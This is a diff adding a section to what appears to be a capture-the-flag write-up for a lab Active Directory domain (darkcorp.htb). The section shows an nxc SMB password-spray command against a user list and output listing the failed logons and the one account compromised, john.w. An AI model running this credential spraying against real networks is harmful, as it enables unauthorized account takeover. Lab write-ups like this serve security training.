@@ -1162,6 +1162,29 @@ I can then use this key to get another password!
 
 The other two keys failed to decrpyt it!
 
+# Compromising `john.w`
+
+```python
+nxc smb dc-01.darkcorp.htb -u users.txt -p 'Pack_Beneath_Solid9!' --continue-on-success
+SMB         172.16.20.1     445    DC-01            [*] Windows Server 2022 Build 20348 x64 (name:DC-01) (domain:darkcorp.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         172.16.20.1     445    DC-01            [-] darkcorp.htb\Administrator:Pack_Beneath_Solid9! STATUS_LOGON_FAILURE 
+SMB         172.16.20.1     445    DC-01            [-] darkcorp.htb\Guest:Pack_Beneath_Solid9! STATUS_LOGON_FAILURE 
+SMB         172.16.20.1     445    DC-01            [-] darkcorp.htb\krbtgt:Pack_Beneath_Solid9! STATUS_LOGON_FAILURE 
+SMB         172.16.20.1     445    DC-01            [-] darkcorp.htb\DC-01$:Pack_Beneath_Solid9! STATUS_LOGON_FAILURE 
+SMB         172.16.20.1     445    DC-01            [-] darkcorp.htb\victor.r:Pack_Beneath_Solid9! STATUS_LOGON_FAILURE 
+SMB         172.16.20.1     445    DC-01            [-] darkcorp.htb\svc_acc:Pack_Beneath_Solid9! STATUS_LOGON_FAILURE 
+SMB         172.16.20.1     445    DC-01            [+] darkcorp.htb\john.w:Pack_Beneath_Solid9! 
+SMB         172.16.20.1     445    DC-01            [-] darkcorp.htb\angela.w:Pack_Beneath_Solid9! STATUS_LOGON_FAILURE 
+SMB         172.16.20.1     445    DC-01            [-] darkcorp.htb\angela.w.adm:Pack_Beneath_Solid9! STATUS_LOGON_FAILURE 
+SMB         172.16.20.1     445    DC-01            [-] darkcorp.htb\taylor.b:Pack_Beneath_Solid9! STATUS_LOGON_FAILURE 
+SMB         172.16.20.1     445    DC-01            [-] darkcorp.htb\DRIP$:Pack_Beneath_Solid9! STATUS_LOGON_FAILURE 
+SMB         172.16.20.1     445    DC-01            [-] darkcorp.htb\taylor.b.adm:Pack_Beneath_Solid9! STATUS_LOGON_FAILURE
+```
+
+Ill spray this password against some of the users, and i have compromised `john.w`
+
+
+
 
 
 
